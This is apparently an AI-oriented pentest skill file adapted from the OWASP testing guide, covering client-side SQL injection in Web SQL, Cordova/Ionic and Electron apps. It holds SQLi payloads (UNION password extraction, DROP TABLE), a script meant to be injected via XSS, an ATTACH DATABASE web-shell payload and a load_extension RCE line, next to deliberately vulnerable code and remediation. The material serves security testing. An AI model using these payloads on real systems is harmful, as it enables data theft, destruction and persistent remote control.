---
name: wstg-inpv-05.8
description: "Testing for Client-Side SQL Injection"
category: input-validation
owasp_id: WSTG-INPV-05.8
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-inpv-05.8

## Test ID

WSTG-INPV-05.8

## Test Name

Testing for Client-Side SQL Injection

## High-Level Description

Client-side SQL injection targets local databases accessed via JavaScript, such as Web SQL Database (deprecated but still present), IndexedDB with SQL-like queries, or SQLite in mobile applications (Cordova, React Native). While less common than server-side SQLi, it can expose sensitive local data or enable privilege escalation in hybrid apps.

---

## What to Check

- [ ] Web SQL Database usage
- [ ] SQLite in hybrid mobile apps
- [ ] IndexedDB query manipulation
- [ ] Local storage SQL parsing
- [ ] Electron app databases
- [ ] Browser extension databases

---

## How to Test

### Step 1: Identify Client-Side Databases

```javascript
// Browser console - Check for Web SQL Database
if (window.openDatabase) {
  console.log("[*] Web SQL Database API available")

  // Try to access existing databases
  try {
    var db = openDatabase("test", "1.0", "Test", 2 * 1024 * 1024)
    console.log("[*] Web SQL Database accessible")
  } catch (e) {
    console.log("[-] Web SQL access error:", e)
  }
}

// Check for IndexedDB
if (window.indexedDB) {
  console.log("[*] IndexedDB available")

  // List databases
  indexedDB.databases().then((dbs) => {
    console.log("[*] Databases:", dbs)
  })
}

// Check for SQL.js or similar libraries
if (window.SQL) {
  console.log("[*] SQL.js library detected")
}
```

### Step 2: Client-Side SQLi Tester

```javascript
// Client-side SQL Injection Test Script
// Run in browser console or inject via XSS

;(function () {
  console.log("=== Client-Side SQL Injection Tester ===")

  // Test payloads
  const payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "1 OR 1=1",
    "' UNION SELECT * FROM sqlite_master--",
    "' AND 1=0 UNION SELECT sql FROM sqlite_master--",
  ]

  // Find and test input fields that might interact with local DB
  const inputs = document.querySelectorAll('input[type="text"], input[type="search"]')

  inputs.forEach((input) => {
    // Check if input has event listeners
    const events = getEventListeners(input)

    if (events.input || events.change || events.keyup) {
      console.log(`[*] Potential DB input: ${input.name || input.id}`)

      // Try injecting payload
      payloads.forEach((payload) => {
        const originalValue = input.value
        input.value = payload

        // Trigger events
        input.dispatchEvent(new Event("input", { bubbles: true }))
        input.dispatchEvent(new Event("change", { bubbles: true }))

        // Restore
        input.value = originalValue
      })
    }
  })

  // Monitor Web SQL transactions
  if (window.openDatabase) {
    const originalOpenDatabase = window.openDatabase
    window.openDatabase = function (...args) {
      console.log("[MONITOR] openDatabase called:", args)
      const db = originalOpenDatabase.apply(this, args)

      // Wrap transaction method
      const originalTransaction = db.transaction
      db.transaction = function (callback, errorCallback, successCallback) {
        const wrappedCallback = function (tx) {
          // Wrap executeSql
          const originalExecuteSql = tx.executeSql
          tx.executeSql = function (sql, params, successCb, errorCb) {
            console.log("[SQL QUERY]:", sql)
            console.log("[SQL PARAMS]:", params)

            // Check for injection indicators
            if (sql.includes("'") && !params.length) {
              console.warn("[POTENTIAL SQLi] Unparameterized query with quotes")
            }

            return originalExecuteSql.apply(this, arguments)
          }
          callback(tx)
        }
        return originalTransaction.call(this, wrappedCallback, errorCallback, successCallback)
      }

      return db
    }
  }

  console.log("=== Monitoring active. Use the application normally. ===")
})()
```

### Step 3: Web SQL Database Testing

```javascript
// Web SQL Injection Test
// Vulnerable code pattern:
function searchUsers(query) {
  var db = openDatabase("myapp", "1.0", "My App", 5 * 1024 * 1024)

  db.transaction(function (tx) {
    // VULNERABLE - String concatenation
    tx.executeSql("SELECT * FROM users WHERE name LIKE '%" + query + "%'", [], function (tx, results) {
      displayResults(results)
    })
  })
}

// Test payloads:
// searchUsers("' OR '1'='1' --");
// searchUsers("' UNION SELECT password FROM users --");
// searchUsers("'; DROP TABLE users; --");

// Check for SQLite system tables
function extractSchema() {
  var db = openDatabase("myapp", "1.0", "My App", 5 * 1024 * 1024)

  db.transaction(function (tx) {
    // Extract table schema
    tx.executeSql("SELECT name, sql FROM sqlite_master WHERE type='table'", [], function (tx, results) {
      for (var i = 0; i < results.rows.length; i++) {
        console.log("Table:", results.rows.item(i).name)
        console.log("Schema:", results.rows.item(i).sql)
      }
    })
  })
}
```

### Step 4: Hybrid Mobile App Testing

```python
#!/usr/bin/env python3
"""
Client-Side SQLi Tester for Hybrid Mobile Apps
Tests Cordova/PhoneGap SQLite databases
"""

import subprocess
import os

class MobileClientSQLiTester:
    def __init__(self, app_path):
        self.app_path = app_path
        self.findings = []

    def decompile_apk(self):
        """Decompile Android APK to analyze JS code"""
        print("[*] Decompiling APK...")
        subprocess.run(['apktool', 'd', self.app_path, '-o', 'decompiled_app'])

    def find_sql_patterns(self):
        """Search for SQL patterns in JS files"""
        print("[*] Searching for SQL patterns...")

        vulnerable_patterns = [
            r'executeSql\s*\([^,]+\+',  # String concatenation
            r'executeSql\s*\(["`\'].*\$\{',  # Template literal
            r'db\.run\s*\([^,]+\+',  # Better-sqlite3 pattern
            r'\.query\s*\(["`\']SELECT.*\+',  # Query with concat
        ]

        js_files = []
        for root, dirs, files in os.walk('decompiled_app'):
            for file in files:
                if file.endswith('.js'):
                    js_files.append(os.path.join(root, file))

        for js_file in js_files:
            with open(js_file, 'r', errors='ignore') as f:
                content = f.read()

                for pattern in vulnerable_patterns:
                    import re
                    matches = re.findall(pattern, content)
                    if matches:
                        print(f"[VULN] Potential SQLi in {js_file}")
                        self.findings.append({
                            'file': js_file,
                            'pattern': pattern,
                            'severity': 'High'
                        })

    def generate_report(self):
        """Generate findings report"""
        print("\n=== CLIENT-SIDE SQLi ANALYSIS ===")
        if not self.findings:
            print("No client-side SQL injection patterns found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] Vulnerable pattern in:")
                print(f"  File: {f['file']}")

# Usage
# tester = MobileClientSQLiTester("app.apk")
# tester.decompile_apk()
# tester.find_sql_patterns()
```

### Step 5: Electron App Database Testing

```javascript
// Electron App SQLite Testing
// Check for better-sqlite3 or sql.js usage

// Monitor require calls
const originalRequire = require
require = function (module) {
  if (module.includes("sqlite") || module.includes("sql")) {
    console.log("[*] SQL module loaded:", module)
  }
  return originalRequire(module)
}

// If better-sqlite3 is used
// Vulnerable pattern:
const db = require("better-sqlite3")("app.db")
const stmt = db.prepare(`SELECT * FROM users WHERE name = '${userInput}'`)

// Test payloads via IPC or exposed functions
// If functions are exposed to renderer:
window.api.searchUsers("' OR '1'='1")
window.api.searchUsers("' UNION SELECT password FROM users --")
```

---

## Tools

| Tool              | Purpose                        |
| ----------------- | ------------------------------ |
| Browser DevTools  | Monitor Web SQL/IndexedDB      |
| Frida             | Hook mobile app database calls |
| apktool           | Decompile Android apps         |
| jadx              | Decompile to Java              |
| Electron DevTools | Debug Electron apps            |

---

## Example Commands/Payloads

### Web SQL Database (browser console)

```javascript
// Enumerate a page's Web SQL database from DevTools console
var db = openDatabase("", "", "", "");
db.transaction(function (tx) {
  tx.executeSql("SELECT name FROM sqlite_master WHERE type='table'", [], function (tx, results) {
    for (var i = 0; i < results.rows.length; i++) console.log(results.rows.item(i).name);
  });
});

// Inject through an app-exposed search function that concatenates input
searchProducts("x' UNION SELECT username,password,3 FROM users--");
searchProducts("x' OR '1'='1");
```

### Hybrid Mobile App (Cordova/Ionic) via Frida

```bash
# Hook SQLite exec calls inside a Cordova/Ionic Android app to log queries
frida -U -f com.target.app -l hook_sqlite.js --no-pause

# hook_sqlite.js (Frida script) intercepts calls into the app's SQLite bridge
# and logs the raw query string, revealing string-concatenation injection points.

# Static analysis path: decompile to find vulnerable local DB queries
apktool d target.apk -o target_decoded
jadx -d target_jadx target.apk
grep -rn "rawQuery\|execSQL" target_jadx/sources | grep -v "?"
```

### Electron App (local SQLite via better-sqlite3 / sql.js)

```bash
# Statically search bundled app.asar for string-concatenated queries
npx asar extract app.asar app_extracted
grep -rn "SELECT .* FROM .*\${" app_extracted --include="*.js"
grep -rn "db.prepare(\`" app_extracted --include="*.js"
```

```javascript
// If a renderer-exposed IPC function passes input straight into a query
window.api.searchUsers("' OR '1'='1");
window.api.searchUsers("' UNION SELECT password,2,3 FROM users --");
```

### SQLite Local RCE via ATTACH DATABASE (Electron / Cordova, if the app's SQLite layer is stacked-query-capable)

If the underlying SQLite call path (e.g. a raw `db.exec()`/multi-statement bridge) allows stacked statements, `ATTACH DATABASE` can plant a web-shell or cron persistence file — treat the local SQLite engine the same as a server-side one once injection is confirmed:

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

```sql
-- load_extension() RCE if the app enabled extension loading (disabled by default)
SELECT load_extension('/tmp/evil.so','entrypoint');--
```

### Blind Schema Enumeration (when results aren't rendered directly)

```javascript
// Boolean-based: compare table name length before extracting characters
searchProducts("x' AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' LIMIT 1)=5 --");
// Character extraction via hex comparison, avoids quoting issues in the injected string
searchProducts("x' AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master LIMIT 1)>HEX('a') --");
```

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `SELECT`/`UNION` payload changes the rows returned by a client-exposed search/filter function | Client-side SQL injection into Web SQL / local SQLite confirmed |
| Frida hook log shows the raw SQL string built via `+`/template-literal concatenation with attacker input | Confirms unsafe query construction inside the app binary |
| `grep` for `rawQuery(`, `execSQL(`, `` db.prepare(`...${ ``  finds no bound parameters (`?`) | Static confirmation of non-parameterized local DB access |
| Extracted data (e.g. other users' rows) appears in local storage/UI after injection | Local database boundary bypass — impacts device data confidentiality even without a network round-trip |
| `ATTACH DATABASE`/multi-statement payload executes without error | Stacked-query capable local SQLite bridge — file write / persistence escalation possible, not just data read |
| Boolean/hex-comparison payloads against `sqlite_master` change the returned rows | Blind local-schema enumeration works even when query results aren't rendered to the UI |

---

## Remediation

```javascript
// SECURE - Web SQL with parameterized queries
function searchUsersSafe(query) {
  var db = openDatabase("myapp", "1.0", "My App", 5 * 1024 * 1024)

  db.transaction(function (tx) {
    // Use parameterized query
    tx.executeSql(
      "SELECT * FROM users WHERE name LIKE ?",
      ["%" + query + "%"], // Parameters passed separately
      function (tx, results) {
        displayResults(results)
      },
    )
  })
}

// SECURE - Better-sqlite3 with parameters
const db = require("better-sqlite3")("app.db")
const stmt = db.prepare("SELECT * FROM users WHERE name = ?")
const result = stmt.get(userInput)

// SECURE - SQL.js with parameters
const stmt = db.prepare("SELECT * FROM users WHERE id = $id")
stmt.bind({ $id: userId })
```

```javascript
// Input validation for client-side queries
function sanitizeForLocalSQL(input) {
  // Basic sanitization (parameterized queries preferred)
  if (typeof input !== "string") {
    return ""
  }

  // Remove or escape dangerous characters
  return input.replace(/['";\\]/g, "")
}
```

---

## Risk Assessment

| Finding                            | CVSS | Severity |
| ---------------------------------- | ---- | -------- |
| Web SQL injection (sensitive data) | 6.5  | Medium   |
| Mobile app SQLite injection        | 7.5  | High     |
| Electron app SQLite injection      | 7.5  | High     |

---

## CWE Categories

| CWE ID     | Title         |
| ---------- | ------------- |
| **CWE-89** | SQL Injection |

---

## References

- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PayloadsAllTheThings - SQLite Injection (ATTACH DATABASE, load_extension)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
- [Web SQL Database (W3C, deprecated but still shipped in Chromium)](https://www.w3.org/TR/webdatabase/)

---

## Checklist

```
[ ] Web SQL Database usage identified
[ ] Client-side JS analyzed for SQL patterns
[ ] Parameterized queries verified
[ ] Mobile app databases tested
[ ] Electron app databases tested
[ ] Findings documented
```
